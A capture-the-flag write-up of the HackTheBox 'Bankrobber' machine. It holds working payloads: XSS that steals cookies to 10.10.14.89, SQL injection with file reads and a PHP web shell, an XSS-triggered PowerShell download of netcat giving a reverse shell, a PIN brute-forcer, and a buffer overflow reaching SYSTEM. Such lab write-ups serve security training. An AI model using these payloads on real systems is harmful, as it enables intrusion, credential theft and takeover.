# Bankrobber [HTB](https://app.hackthebox.com/machines/209)
![bankrobber-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/bankrobber-01.png)

## Recon 

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 bankrobber.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/ports-02.png)


From here, I send `nmap` to start probing the found ports for more information:

```bash
nmap -p 80,443,445,3306 -sCV bankrobber.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/nmap-res-03.png)


We have the following:

+ An Apache/2.4.39 server on ports 80 & 443.
+ An SMB server on port 445.
+ A MariaDB database on port 3306.


Looking through the list, the most interesting entry in my opinion is the Apache server which seems to be running an identical site on both HTTP/HTTPS. 


Let's have a look at this Apache server.


## Apache Ports 80 & 443

Browsing towards `http://bankrobber.htb/` returns the following page:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/site-04.png)


The HTTPS version of the site seems to be identical. 


The `buy E-Coin` button is empty, while scrolling down a bit reveals two HTTP forms, one for login in, and the other is for signing up.  


Before playing around with the authentication mechanism of the system, I decided to run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bankrobber.htb/FUZZ -e .txt,.xml,.html,.php,.conf
```

![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/ffuf-05.png)

![ffuf-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/ffuf-06.png)


The most interesting entries on the list in my opinion are the `notes.txt` file, and the directories `phpmyadmin` & `admin`. 


+ `phpmyadmin`

We can see based on the `ffuf` scan that the status code for this directory was a `403` forbidden response, but opening this page does reveal something interesting:

![phpmyadmin-err-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/phpmyadmin-err-07.png)


The error message mentions [Xampp](https://en.wikipedia.org/wiki/XAMPP), which is a free and open-source cross-platform web server solution developed by Apache, consisting mainly of the Apache HTTP Server, MariaDB database, and interpreters for scripts written in the PHP and Perl. This fits our target perfectly. 


I did a bit of research as to how we can exploit this kind of server, and I did found some interesting ideas, but nothing that I thought could work at this stage of enumeration.


So I deicded to leave this piece of inforamtion alone for now and check the other entries from the `ffuf` scan.


+ `notes.txt`

The file reads as such:

![notes-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/notes-08.png)


THe first ntoe says that they need to move files from the default Xampp folder. The second note mentioned that, an encoding takes place on comments not originating from the localhost. I wasn't sure what these messages meant exactly, as they are a bit cryptic.  


So I decided to leave these messages alone for now and start testing the authentication. 


To start test the authentication, I tried a few generic credentials, like `admin : admin`, `root : bankrobber`, etc, and a few SQLi payloads which all seem to have failed. 


So I created a user account of `htb : htb`, which was accepted and logged in to my account. While logging in, I intercepted the transaction in my Burp proxy and saw the following:

![set-cookies-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/set-cookies-09.png)


The target website assigns three cookies of: `id`, `username` & `password`. The contents of the latter two seem to be a base64 encoded string. This immediately gets my attention, because if we get these cookies, then so do other users, which gets me thinking about [XSS](https://owasp.org/www-community/attacks/xss/). 


At any case, after I log in, I get redirected to the `/user` page. At the top we can see our `E-Coin` balance:

![user-dir-top-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/user-dir-top-10.png)


We have 990 E-coins. With an E-coin being worth 1337$ a pop, this gives us a balance of about 1.3 million dollers, not too bad...


If we scroll to the buttom, we can see another form, this time for a E-coin transfer feature:

![user-dir-buttom-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/user-dir-buttom-11.png)


There is a fields for amount, ID of recipient (probably the same from the cookie), and a comment to the recipient. This comment field immediately gets me thinking about the note, could these be the mentioned comments? 


I wanted to see if I can get another user's profile page by changing my `id` cookie value from 3 to 2 which resulted in the following:

![hijacking-id-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/hijacking-id-12.png)


We can see that our balance is now changed. This is a [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) vulnerability, which is #1 on OWASP top 10 web-vulnerabilities for 2021. But besides stealing useres E-coins, I dont see a clear way to get access to the system from this at the moment, I just thought it was wirth mentioning. 


At this point I deicded to make a dummy transfer from the hijcked ID 2 to my account at ID 3, just to see if it would work. So I sent the following details:

![details-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/details-13.png)


Which resulted in the following pop up:

![alert-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/alert-14.png)


What? the transfer is on hold to be reviewed by the admin? 


This means that the admin probably has to login to he's account, get redirected to the admin panel where he should see our transfer request displayed in some form or another. In other words, we can potentially control what gets rendered to the admin panle. This screams `XSS`! 


We also know that a logged in user has he's credentials included in every request he makes to the site in the form of cookies. This means that we can try and steal the admin's credentials by sending an XSS payload in one of the transfer request parameters. I'm thinking about the comments parameter, since it has mentioed in the `notes.txt` file we read earlier. 


To test for this vulnerability, I start a simple python web server using:

```bash
python3 -m http.server 80
```

And I send the following payload as the a comment to a new transfer request: 

```html
<script src=http://10.10.14.89/hook.js></script>
```

If the target is vulnerable, the admin should contact my server to fetch for `hook.js` once he's browser loads my malicious transfer request. 


After sending the transfer reqeust I wait a sec, then get a connection to my server:

![get-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/get-15.png)


The target is vulnerable! 


From here, I modify my payload to get the contents of the admin's cookies using:

```html
<script>var i=new Image;i.src="http://10.10.14.89/?"+document.cookie;</script>
```

Which works:

![loot-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/loot-16.png)


Base64 decoding the cookies returns `admin : Hopelessromantic`. I use the creds and login to the admin panel:

![admin-panel-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/admin-panel-17.png)


### Admin Panel

In the admin panel we can see the transfer request queue:

![queue-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/queue018.png)


The fact that the comment section is displayed in this manner on the admin panel, is what allowed us to perform the blind XSS and steal the cookies. 


Scrolling down a bit, we can see a feature to lookup users based on thier ID's:

![feature-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/feature-19.png)


This feature probably utilaizes the SQL database in order to fetch the username associtaed with the supplied ID from the correct table. This makes it an interesting target for SQLi which we'll explore later. 
  

Then down at the buttom we see another feature:

![backdoor-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/backdoor-20.png)


The feature essentially allows us to execute commands on the underlaying OS, which makes it an very attractive target to gain access to the system. But using this featrue is restricted to the localhost interface only. So I decide to test for SQLi first, and see if I can find a way to access the localhost to execute a reverse shell payload. 


I start by intercepting a user lookup request in my Burp proxy and send it to Repeater so I can play around with inputs easiy. Then, I try to break the SQL query with a payload like this `2'`:

![broke-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/broke-21.png)


Something definitely happend. So I try to use the `ORDER BY` technique to enumerating columns in an attempt to find a payload that fits the structure of the current table. This is needed in order to perform more complex queries later. 


For example, the following query seems to work `5' ORDER BY 1;--`:

![works-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/works-22.png)


So now I start increamening the values, with `ORDER BY 1,2;--`, etc. When I get to 4, the application breaks again:

![breaks-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/breaks-23.png)


This broke at four because there is probably only thee columns in the current table. Now I want to see if I can add the `UNION` statement in order to query information from other tables later on. I use the following payload: `5' UNION SELECT 1,2,3;--`

![union-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/union-24.png)


Looks good. Let's try to pull the name of the database as one of the parameters to the statement with something like this: `5' UNION SELECT 1,database(),3;--`

![db-name-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/db-name-25.png)


We can see we are able to pull information from deep inside the SQL server. At this point I enumerated the entire `bankrobber` database, I pulled all the tables and dumped evey column from evey table. Unfortunately, this didn't lead to any new revelations. 


For example, the most interesting table was `users`, which had information we already possess, like the credentials to the admin panel. 


Instead, I decided to list any other databases present on the server with: `5' UNION SELECT 1,schema_name,3 FROM information_schema.schemata;--`:

![databases-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/databases-26.png)


This is just some of the databases, but I enumerated all of them and found nothing of substance. 


So I decided to change my approach, I know that it's possible to read and possibly wrtie to files from an SQL query. I deicded to try to read a file, which can be done using the `LOAD_FILE()` statement. 


I searched online for a default file that will be included in an Xampp server and I found [this](https://stackoverflow.com/questions/18902887/how-to-configuring-a-xampp-web-server-for-different-root-directory) Stack-Overflow post that mentioned `C:/xampp/apache/conf/httpd.conf`


I try to read the file and see the following:

![server-root-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/server-root-28.png)


We are able to read files! This file also configures the root directory to the web server, which should be at `C:/xampp/apache`. To verify this, I try to pull a file that I know is present in the root directory like `notes.txt`:

![verify-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/verify-29.png)


Here it is! 


From here, I tried to write a PHP web-shell payload into a file in the root directory of the web server with a payload like this: `5' UNION SELECT 1,'<? system($_GET[\'c\']); ?>',2,3 INTO OUTFILE 'C:/xampp/htdocs/htb.php';--` Unfortunately, this didn't work. 


Instead, I decided to shift gears, and focus on the second feature in the admin panel. Now that we know we can read files, and we know where the root of the web server is located, we can read the contents of the `backdoorchecker.php` script and analyze it. 


The script reads as such:

```php
include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
		// FILTER ESCAPE CHARS
		foreach($bad as $char){
			if(strpos($_POST['cmd'],$char) !== false){
				die("You're not allowed to do that.");
			}
		}
		// CHECK IF THE FIRST 2 CHARS ARE LS
		if(substr($_POST['cmd'], 0,strlen($good)) != $good){
			die("It's only allowed to use the $good command");
		}

		if($_SERVER['REMOTE_ADDR'] == "::1"){
			system($_POST['cmd']);
		} else{
			echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
		}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>
```

The script performs a basic authentication check for admin's credentials. Then, it checks if the supplied command starts with `dir`. It also tries to prevent command injection by filtering characters like `$(` and `&`, but we can also use `|` & `;` to chain commands. 


The real question is how can we execute commands through the localhost interface? The only possible way I see of doing this, is through the use of the XSS vulnerability we found earlier.


Instead of stealing the admin's cookies, this time, we will make him make a POST request to the `backdoorchecker.php` script with a reverse shell payload added. We will then host this script via a python web server and send another trasnfer request. 


The JavaScript code should look like this:

```javascript
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.89/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.89 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);
```

I save this script to a file in my working directory. Then I grab a copy of `nc64.exe` to my working directory as well, and I host both files via a python server:

```bash
python3 -m http.server 80
```

Then, I start my local listener with:

```bash
rlwrap nc -lnvp 443
```

And finally, I create another transfer request, with the following comment:

```html
<script src="http://10.10.14.89/htb.js"></script>
```

After a couple of seconds I get the connections to my python server:

![conns-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/conns-30.png)


And on my netcat listener I get a shell:

![shell-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/shell-31.png)


## Privilege Escalation

After landing on the box, I try to hunt down for quick wins, I start by looking at my privileges with `whoami /priv`, but we have no useful privileges. 


Then I try to list any stored credentials using `cmdkey /list` and I see this:

![cmdkey-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/cmdkey-32.png)


I search online and I found [this post](https://superuser.com/questions/234537/what-is-virtualapp-didlogical) on Stack Exchange. In short, it's not going ot help us root this box. 


While looking through the filesystem of this box, i've noticed that the language here is set to dutch:

![dutch-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/dutch-33.png)


`Toegang geweigerd` in dutch is `access denied` in english. 


After searching around the filesystem a bit, I found an unusual custom binary in the C drive:

![bankv2-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/bankv2-34.png)


Though trying to read the permissions to the file using `icacls` fails with `access denied` error. So instead, I decided to look at the open ports on the system using `netstat -ano`:

![netstat-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/netstat-35.png)


Port 910 jumped out the most to me, since it didn't appear in our initial `nmap` scan. I tried to identify this binary in the running process list, but listing processes with `wmic service list`, or `sc query state=all` fails with access denied as well.


Trying to connect to this port from our attack machine works, but nothing is printed to the screen. But connecting to it from the target seems to work:

![connect-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/connect-36.png)


After I connect, the shell stalls until I hit enter and then I get prompted for a pin. Typing an invalid pin terminates the connection. 


Trying to brute force this pin shouldn't be an issue, but we need to do this from our attack machine. For that, we need to tunnel this port over to our attack machine. To accomplish this, I will [chisel](https://github.com/jpillora/chisel).


I download a [64-bit version](https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz) of chisel for windows to my attack machine and host it up via a pyhton web server. 


Then, I download it from the target using:

```cmd
certutil -urlcache -f http://10.10.14.89/chisel.exe %temp%/chisel.exe
```

Then from my attack machine I will start the chisel server with:

```bash
chisel server -p 4545 --reverse
```

And connect from the target using:

```bash
%temp%\chisel.exe client 10.10.14.89:4545 R:910:127.0.0.1:910
```

On my server I recive the connection and the tunnel is established:

![established-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/established-37.png)


Now that we have the service on our local host we can start brute forcing the pin. For that, we can use this simple python script:

```python
#!/usr/bin/python3

import socket, sys

for i in range(10000):
    sys.stdout.write(f"\rTesting: {i:04d}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 910))
    s.recv(1024)
    s.send(f"{i:04d}\n".encode())
    resp = s.recv(4096)
    if not b"Access denied" in resp:
        print(f"\rFound pin: {i:04d}")
        break
    s.close()
```

Which results in the following:

![found-pin-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/found-pin-38.png)


After supplying the correct pin, we are asked to enter an amount of E-coins to transfer:

![amount-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/amount-39.png)


After I enter an amount, the program notifies me it's executing a different binary at `C:\Users\admin\Documents\transfer.exe` and terminates. Supplying an arbitrary amount value like `abcd` also seems to result in the following output. 


### Buffer Overflow

At this point I started to suspect a buffer-overflow situation, so I generated a large input with `python3 -c "print('A'*50)"` and supplied it to the program which resulted in:

![overflown-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/overflown-40.png)


We can see that we've overflown the value of the executable it's running. This means that the value for whatever this binary executes next, is stored on the stack itself and we've successfully overflown it.


To get the correct offset to the EIP I will use `pattern_create`:

![create-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/create-41.png)


I supply this to the program and get the value that the program tries to exceute:

![value-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/value-42.png)


I take the first four bytes and supply them to `pattern_offset`:

![offset-43]()


The return address sits 32 bytes form the start of the buffer. From here, we can try to execute the `nc` file which we uploaded to the target in order to get a shell from this, using something like this:

```bash
python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.89 9001"'
```

I start my listener with:

```bash
nc -lnvp 9001
```

And send the payload to the target:

![send-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/send-44.png)


Which gives me shell as the SYSTEM:

![root-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Bankrobber/img/root-45.png)
